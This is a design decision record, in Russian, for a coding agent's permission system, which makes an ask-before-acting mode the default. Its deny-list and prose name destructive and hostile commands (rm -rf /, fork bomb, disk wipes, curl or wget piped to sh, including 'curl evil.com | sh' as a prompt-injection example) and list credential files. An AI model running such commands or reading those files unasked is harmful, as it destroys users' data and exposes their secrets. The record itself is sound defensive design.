# ADR-004: Ask-режим permissions по умолчанию

**Дата:** 2026-10-20
**Статус:** Accepted
**Decision makers:** core team

---

## Контекст

OryaAgent выполняет bash-команды, пишет и редактирует файлы на машине пользователя. Безопасность — критическое требование. [`agents-architect.md`](../agents-architect.md) отмечает: «Безопасность — сильнейшая сторона архитектуры Claude Code» (permission-режимы, allow-листы, sandbox bash, MDM, sec-default). Но для MVP полное повторение Claude Code security — overengineering.

[`self-agent.md`](../self-agent.md) указывает: «Bash без подтверждения — недопустимо в MVP. Документ: Claude Code помечает безопасность как 'сильнейшую сторону архитектуры', но это не значит, что MVP должен повторить всё — достаточно ask-режима + allow-list.»

Нужно было решить: какой permission mode по умолчанию для MVP.

## Рассмотренные альтернативы

### Вариант A: AUTO mode по умолчанию (всё разрешено)

- **Плюсы:**
  - Минимум friction для пользователя — агент сразу работает
  - Подходит для CI/scripts/headless usage
  - Ближе к поведению Cursor, Copilot Workspace
- **Минусы:**
  - Malicious или hallucinating LLM может выполнить `rm -rf /` без подтверждения
  - Compromised dependency в проекте — может триггерить prompt injection, который приведёт к destructive actions
  - Пользователь не понимает, что происходит — агент «магически» меняет файлы
  - Audit-trail менее полезен, если всё auto-approved

### Вариант B: ASK mode по умолчанию (каждое destructive action требует подтверждения)

- **Плюсы:**
  - Пользователь в контроле — каждое опасное действие видно
  - Prompt injection атаки — детектируются (внезапный `bash: rm -rf` удивит)
  - Audit-trail более полный (явный user consent)
  - Безопасность «by default» — работает из коробки
  - Соответствует философии Claude Code (default режим — самый безопасный)
- **Минусы:**
  - Friction для частых операций (каждый `bash: ls` спрашивать — annoying)
  - CI/headless usage — невозможен без переключения в AUTO
  - Пользователь может привыкнуть кликать «yes» (habituation) — снижает эффективность

### Вариант C: PLAN mode по умолчанию (только read, никаких writes/bash)

- **Плюсы:**
  - Maximum safety — агент только читает, не меняет
  - Хорошо для exploration / understanding codebase
- **Минусы:**
  - Бесполезно для 90% задач (рефакторинг, написание кода, фикс багов)
  - Пользователь должен явно переключать в ASK mode для действий
  - UX — слишком ограничительный

### Вариант D: Smart mode (ML-based risk scoring)

- **Плюсы:**
  - Минимум friction для безопасных операций
  - Maximum safety для опасных
- **Минусы:**
  - ML-модель для risk scoring — это отдельный продукт, не MVP
  - Ложные срабатывания / false negatives — непредсказуемое поведение
  - Explainability сложная — пользователь не понимает, почему спросили

## Решение

**Вариант B: ASK mode по умолчанию, с allow-list для часто используемых безопасных операций.**

Конкретно:

1. **Default mode:** `ASK`
2. **Allow-list** — предустановленный список безопасных паттернов:
   - `bash: ls *`, `bash: cat *`, `bash: pwd`, `bash: git status`, `bash: git diff *`, `bash: grep *`, `bash: find *`, `bash: head *`, `bash: tail *`, `bash: wc *`
   - `read: *` (внутри working dir, не sensitive)
   - `glob: *`, `grep: *`
3. **Deny-list** — предустановленный список явно опасных паттернов:
   - `bash: rm -rf /`, fork bomb, `dd if=...of=/dev/sd*`, `mkfs.`, `chmod 777 /`, `curl ... | sh`
4. **Sensitive files** — отдельный список паттернов, требующих подтверждения даже в AUTO mode
5. **AUTO mode** — opt-in через `orya --auto` или `orya config set permissions.mode auto`. Подходит для CI/scripts.

См. [05-security-model.md](../spec/05-security-model.md) для полной спецификации.

## Обоснование

1. **«Secure by default» — принцип зрелой security.** Если пользователь явно не opt-in в less secure behavior — он получает most secure configuration. Это противоположность «convenient by default», что приводит к инцидентам.

2. **Allow-list покрывает friction.** Если `ls`, `cat`, `git status`, `grep` — разрешены без подтверждения, то 80% типичных bash-call-ов — frictionless. ASK mode включается только для действительно destructive actions.

3. **Prompt injection defense.** ASK mode — ключевой defence layer. Если LLM (через prompt injection) пытается выполнить `curl evil.com | sh`, пользователь увидит prompt и отклонит. Без ASK mode — выполнится тихо.

4. **Audit-trail полнее.** Каждое разрешение (allow/deny) и user-decision логируется. Audit-trail становится полным: «user approved bash call X at time Y».

5. **Соответствует Claude Code.** Claude Code — де-факто стандарт для coding agents. Их default режим — также «ask перед destructive actions». Соответствие — упрощает onboarding для Claude Code users.

6. **Habituation risk — manageable.** Если ask-промпты качественные (показывают full command, not just tool name) — пользователь обращает внимание. Quality over quantity: лучше меньше промптов, но каждый — с полным контекстом.

7. **AUTO mode доступен.** Для CI/scripts — `orya --auto` или env var `ORYA_PERMISSION_MODE=auto`. Это explicit opt-in, не default.

## Последствия

**Позитивные:**

- Безопасность «by default» без конфигурации
- Audit-trail полный с user consent
- Prompt injection defense layer
- Соответствие индустриальному стандарту (Claude Code)
- Allow-list покрывает 80% friction для безопасных операций
- Explicit opt-in для AUTO (пользователь понимает риск)

**Негативные:**

- Первый запуск — пользователь видит много ask-промптов (пока не настроит allow-list)
- CI scripts требуют `--auto` флага (или env)
- Habituation risk — пользователь может начать слепо кликать «yes»
- Sensitive files detection — false positives могут раздражать (например, `README.md` матчится на `*readme*`, если pattern слишком широкий)

**Нейтральные:**

- Allow-list — configurable через `~/.orya/permissions.yml`
- Deny-list — предустановленный, но расширяемый
- Sensitive files — отдельный список, не mixing с rules

## Реализация (детали)

### Default config

`~/.orya/permissions.yml` (создаётся при первом запуске):

```yaml
mode: ask  # default

# Allow-list: matches bypass ask-mode
allow_rules:
  - tool: bash
    pattern: "ls(\\s+|$).*"
    description: "ls and arguments"
  - tool: bash
    pattern: "cat\\s+[^|;&]*"
    description: "cat files (no pipes/chains)"
  - tool: bash
    pattern: "pwd"
  - tool: bash
    pattern: "git\\s+(status|diff|log|branch)(\\s+|$).*"
    description: "git read commands"
  - tool: bash
    pattern: "grep(\\s+|$).*"
  - tool: bash
    pattern: "find\\s+[^|;&]*"
  - tool: bash
    pattern: "head\\s+[^|;&]*"
  - tool: bash
    pattern: "tail\\s+[^|;&]*"
  - tool: bash
    pattern: "wc\\s+[^|;&]*"
  - tool: read
    pattern: ".*"  # любой read внутри working_dir, не sensitive
  - tool: glob
    pattern: ".*"
  - tool: grep
    pattern: ".*"

# Deny-list: matches always blocked, even in auto mode
deny_rules:
  - tool: bash
    pattern: "rm\\s+-rf?\\s+/(\\s|$)"
    description: "rm -rf / — recursive root deletion"
  - tool: bash
    pattern: ":\\(\\)\\s*\\{\\s*:\\|:&\\s*\\}\\s*;"
    description: "fork bomb"
  - tool: bash
    pattern: "dd\\s+if=.*of=/dev/(sd|nvme|hd)"
    description: "dd to disk device"
  - tool: bash
    pattern: "mkfs\\."
    description: "filesystem format"
  - tool: bash
    pattern: ">\\s*/dev/(sd|nvme|hd)"
    description: "redirect to disk device"
  - tool: bash
    pattern: "chmod\\s+-R?\\s+777\\s+/"
    description: "chmod 777 on root"
  - tool: bash
    pattern: "curl\\s+.*\\|\\s*(sh|bash|zsh)"
    description: "piped remote script execution"
  - tool: bash
    pattern: "wget\\s+.*\\|\\s*(sh|bash|zsh)"
    description: "piped remote script execution"

# Sensitive files — require ask even in auto mode
sensitive_files:
  - "*.env"
  - ".env.*"
  - "*credentials*"
  - "*secrets*"
  - "*token*"
  - "*.pem"
  - "*.key"
  - "id_rsa*"
  - "id_ed25519*"
  - "*.p12"
  - "*.pfx"
  - "*.keystore"
  - ".aws/credentials"
  - ".npmrc"
  - ".pypirc"
  - ".git-credentials"
  - ".netrc"

audit_log: true
```

### Decision tree

```
ToolCall → check deny-list → if match → DENY
         → check allow-list → if match → ALLOW
         → check sensitive_files → if match → ASK (always)
         → check mode → if AUTO → ALLOW, if ASK → ASK
```

### Permission prompt UX

```
┌─────────────────────────────────────────────────┐
│ ⚠️  bash wants to execute:                       │
│                                                  │
│   $ rm -rf build/                                │
│                                                  │
│ Working dir: /home/user/project                  │
│ Risk: destructive (rm -rf)                       │
│                                                  │
│ [y] Yes  [n] No  [a] Always allow this pattern  │
│ [s] Show command details  [Esc] Cancel session   │
└─────────────────────────────────────────────────┘
```

- **y** — single approval, log to audit
- **n** — single deny, log to audit
- **a** — add to allow-list, persist to `permissions.yml`
- **s** — show full details (full command, env vars, cwd)
- **Esc** — abort session (пользователь не доверяет)

### AUTO mode

```bash
# CLI flag
orya --auto

# Env var (для CI/scripts)
export ORYA_PERMISSION_MODE=auto
orya "fix all type errors"

# Config
orya config set permissions.mode auto
```

В AUTO mode:
- Allow-list — применяется
- Deny-list — применяется
- Sensitive files — ВСЁ ЕЩЁ требуют ask (критичные даже в auto)

Если нужно full-auto без sensitive-checks (для CI на доверенных данных):
```bash
orya --auto --no-sensitive-checks  # only for trusted repos
```

## Критерии пересмотра решения

1. **Пользователи массово жалуются на friction** (>50% запросов в Issues) — пересмотреть allow-list, расширить defaults.
2. **Habituation risk становится проблемой** (users жалуются, что «потеряли бдительность») — рассмотреть random ask-ы даже в allow-list для risky patterns.
3. **Sandbox (v2) делает ask-mode менее критичным** — в sandbox-mode можно relax до AUTO, если sandbox ограничивает damage radius.

## Связанные документы

- [05-security-model.md](../spec/05-security-model.md) — полная threat-модель и спецификация permissions
- [04-tool-contracts.md](../spec/04-tool-contracts.md) — поведение инструментов с permission-gate
- [01-module-contracts.md](../spec/01-module-contracts.md) раздел 10 — `permissions` модуль
- [agents-architect.md](../agents-architect.md) — Claude Code permission-режимы как референс
- [self-agent.md](../self-agent.md) — пункт 8 про permissions в MVP
- [SECURITY.md](../../SECURITY.md) — пользовательская документация
